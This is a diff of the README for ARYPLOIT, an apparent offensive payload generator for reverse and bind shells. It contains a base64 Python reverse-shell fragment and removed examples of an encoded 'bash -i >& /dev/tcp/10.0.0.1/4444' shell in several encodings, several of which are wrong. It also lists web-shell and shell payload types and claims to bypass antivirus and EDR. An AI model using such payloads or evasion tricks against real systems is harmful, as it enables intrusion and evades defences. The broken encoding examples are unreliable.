@@ -67,13 +67,44 @@ aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxz
 ```
 🛠️ Encoders (Evasion & Obfuscation)
 
-Encoder,Description,Example Output
-base64,Standard Base64 encoding,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=
-url,URL encoding,bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F...
-hex,Hexadecimal encoding,62 61 73 68 20 2d 69 20 3e 26 20 2f 64 65 76
-xor,XOR encoding (key: 0x55),¶¬¦¬§¦¬¦§¬¶¦§¬¶¦§¬¶
-rot13,ROT13 cipher,onfu -v >& /qri/gpc/10.0.0.1/4444 0>&1
-reverse,Reverse the string,1>0& 4444/1.0.0.10 cpd/cte/evd/ :ptth
-caesar,Caesar cipher (shift +3),edvk -l >& /gfy/wfs/10.0.0.1/4444 0>&1
-binary,8-bit binary,01100010 01100001 01110011 01101000
-unicode,Unicode escape,\u0062\u0061\u0073\u0068
+platform type     lang & method
+Windows Reverse  cmd,powershell.nc
+Web     Reverse  PHP, ASP, JSP, ASPX
+Linux   Reverse  bash, nc, python, perl, ruby, socat, openssl, telnet
+Linux   Bind     nc, bash, socat, python, perl
+Windows Bind     nc, powershell
+
+Full list: Run list rev_payloads or list bind_payloads.
+
+🔍 Why ARYPLOIT?
+🚀 Faster than Metasploit for quick payload generation.
+🛡️ Bypasses basic AV/EDR with encoder chaining.
+🎓 Perfect for learning reverse shells & evasion.
+🔧 Extensible – Add your own payloads & encoders.
+
+📢 Contributing
+Contributions are welcome! Open a Pull Request or issue for:
+
+New payloads
+Better encoders
+Bug fixes
+Documentation improvements
+
+Code of Conduct: Be respectful & ethical.
+
+⚠️ Legal Disclaimer
+⚠️ ARYPLOIT is for authorized testing only.
+⚠️ Unauthorized use is illegal.
+⚠️ The author is not responsible for misuse.
+
+📣 Spread the Word
+If you find aryploit useful, star ⭐ this repo and share it with your friends!
+Follow for updates:
+
+📜 License
+This project is licensed under the MIT License – see LICENSE for details.
+
+<div align="center">
+  <sub>Built with ❤️ by <a href="https://github.com/giriaryan694-a11y">Aryan Giri</a></sub>
+</div>
+```
